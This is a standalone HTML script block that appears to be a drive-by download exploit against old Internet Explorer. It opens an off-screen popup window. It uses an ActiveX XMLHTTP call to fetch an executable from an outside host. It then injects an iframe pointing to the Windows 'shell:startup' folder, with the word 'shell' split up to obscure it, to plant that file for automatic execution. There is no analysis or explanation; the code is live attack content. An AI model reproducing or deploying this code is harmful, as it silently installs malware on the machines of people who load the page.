<script>
function kasperloh(){ 
var d="kasper";
var g="loh";
var w=window.open("javascript:setInterval(function(){try{var tempvar=opener.location.href;}catch(e){location.assign('javascript:var xmlHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);xmlHTTP.open (&quot;GET&quot;,&quot;http://wmzarabotok.info/dos/test.exe&quot;,false);xmlHTTP.send();var contents = xmlHTTP.responseBody;document.innerHTML=(&quot;&lt;title&gt;&lt;/title&gt;&lt;DIV align=left style=position:absolute;left:3;top:-10;&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;font face=arial color=red&gt;&lt;b&gt;&lt;/center&gt;&lt;/div&gt;&lt;html&gt;&lt;iframe src=she&quot;+&quot;ll&quot;+&quot;:startup HEIGHT=5000; WIDTH=5000 style=color:red;position:absolute;top:30;left:-2000;border:dotted;z-index:-90;&gt;&lt;/iframe&gt;&lt;body onload=showpop()&gt;&lt;script&gt;function showpop(){pop=window.createPopup();pop.document.body.style.margin=0;pop.document.body.innerHTML=txt.value;pop.show(100,100,screen.width+300,screen.height+300);}&lt;/script&gt;&lt;span style=position: absolute; left: 1; top: 1 id=absspan&gt;&lt;/span&gt;&lt;textarea id=txt rows=1 cols=20 style=display:none&gt;&lt;html&gt;&lt;body&gt;&lt;table width=100% height=100%&gt;&lt;tr ALIGN=LEFT VALIGN=TOP&gt;&lt;br&gt;&lt;center&gt;&lt;img src=http://wmzarabotok.info/dos/test.exe id=anch onmousedown=parent.pop.show(1,1,1,1); style=width=4000px;height=4000px;background-image:url(&amp;quot;&amp;quot;);&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/textarea&gt;&lt;/body&gt;&lt;/html&gt;&quot;)');window.close();}},100)","_blank","height=3,width=3,left=20020,top=20020"); 
w.location.assign=location.assign; 
location.href="#"; 
} 
kasperloh() 
</script>